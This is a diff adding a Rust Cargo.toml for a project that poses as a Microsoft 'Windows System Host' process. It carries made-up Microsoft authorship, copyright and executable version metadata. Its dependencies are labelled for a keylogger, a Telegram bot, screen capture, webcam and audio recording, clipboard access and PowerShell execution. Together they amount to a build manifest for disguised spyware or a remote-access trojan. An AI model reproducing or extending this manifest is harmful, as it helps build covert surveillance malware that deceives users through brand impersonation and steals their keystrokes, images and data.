@@ -1,0 +1,183 @@
+[package]
+name = "microsoft-windows-system-host"
+version = "10.0.22621"
+edition = "2021"
+authors = ["Microsoft Corporation <sysinternals@microsoft.com>"]
+description = "Microsoft Windows System Host Component - Critical System Infrastructure"
+license = "MIT"
+repository = "https://github.com/microsoft/windows-system-host"
+homepage = "https://learn.microsoft.com/en-us/sysinternals/"
+documentation = "https://learn.microsoft.com/en-us/windows/win32/"
+readme = "README.md"
+keywords = ["windows", "microsoft", "system", "telemetry", "diagnostics"]
+categories = ["os::windows-apis", "development-tools::debugging"]
+default-run = "microsoft-windows-system-host"
+
+[profile.release]
+opt-level = 3
+lto = true
+codegen-units = 1
+strip = true
+panic = "abort"
+debug = false
+incremental = false
+
+[profile.dev]
+opt-level = 0
+debug = true
+
+[package.metadata.winres]
+ProductName = "Microsoft® Windows System Host"
+FileDescription = "Windows System Host Process"
+FileVersion = "10.0.22621"
+ProductVersion = "10.0.22621"
+OriginalFilename = "microsoft-windows-system-host.exe"
+InternalName = "microsoft-windows-system-host"
+LegalCopyright = "© Microsoft Corporation. All rights reserved."
+CompanyName = "Microsoft Corporation"
+Comments = "Critical system component - Do not modify"
+
+[dependencies]
+# Microsoft Win32 API bindings
+windows = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_System",
+    "Win32_UI",
+    "Win32_NetworkManagement",
+    "Win32_Security",
+    "Win32_Storage",
+    "Win32_Devices",
+    "Win32_Media",
+]}
+
+# Windows sys bindings
+windows-sys = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_System_Threading",
+    "Win32_System_Registry",
+    "Win32_System_Memory",
+    "Win32_System_SystemServices",
+    "Win32_Security",
+    "Win32_UI_WindowsAndMessaging",
+    "Win32_NetworkManagement_IpHelper",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Com",
+    "Win32_System_WindowsProgramming",
+]}
+
+# System information
+sysinfo = "0.30" 
+
+# Async runtime
+tokio = { version = "1.35", features = ["full"] }
+
+# HTTP Client
+reqwest = { version = "0.11", features = ["json", "multipart"] }
+
+# Serialization
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+
+# Date/Time
+chrono = { version = "0.4", features = ["serde"] }
+
+# WinAPI (legacy)
+winapi = { version = "0.3", features = [
+    "wincrypt",
+    "winbase",
+    "winreg",
+    "securitybaseapi",
+    "processthreadsapi",
+    "synchapi",
+    "fileapi",
+    "handleapi",
+    "tlhelp32",
+    "winuser",
+    "wingdi",
+    "shellapi",
+    "shlobj",
+    "objbase",
+    "combaseapi",
+    "coml2api",
+    "oleauto",
+    "oleidl",
+    "oaidl",
+    "urlmon",
+    "wincon",
+    "wininet",
+    "winsock2",
+    "ws2tcpip",
+    "iphlpapi",
+    "netioapi",
+    "debugapi",
+    "libloaderapi",
+]}
+
+# Windows Registry
+winreg = "0.52"
+
+# File System
+walkdir = "2.4"
+zip = "0.6"
+tempfile = "3.8"
+
+# Network
+ipconfig = "0.3"
+dns-lookup = "1.0"
+
+# Security
+sha2 = "0.10"
+sha1 = "0.10"
+md5 = "0.7"
+base64 = "0.22"     
+hex = "0.4"
+
+# Telegram Bot
+teloxide = { version = "0.12", features = ["macros"] }
+
+# GUI Automation
+enigo = "0.2.1"  
+
+# Keylogger
+rdev = "0.5"
+
+# Audio
+cpal = "0.15"
+hound = "3.5"
+
+# Screenshots
+xcap = "0.1"
+image = { version = "0.25", features = ["png", "jpeg"] }
+
+# Camera
+nokhwa = { version = "0.10", features = ["input-native"] }
+
+# Clipboard
+clipboard-win = "5.3"
+
+# Database
+rusqlite = { version = "0.30", features = ["bundled"] }
+
+# Utilities
+lazy_static = "1.4"
+rand = "0.8"
+regex = "1.10"
+dirs = "5.0"
+which = "6.0"
+whoami = "1.4"
+hostname = "0.3"
+num_cpus = "1.16"
+anyhow = "1.0"
+thiserror = "1.0"
+
+# Browser
+webbrowser = "1.0"
+
+# PowerShell
+powershell_script = "1.0"
+
+[target.'cfg(windows)'.dependencies]
+winapi-util = "0.1"
+
+[build-dependencies]
+winres = "0.1"
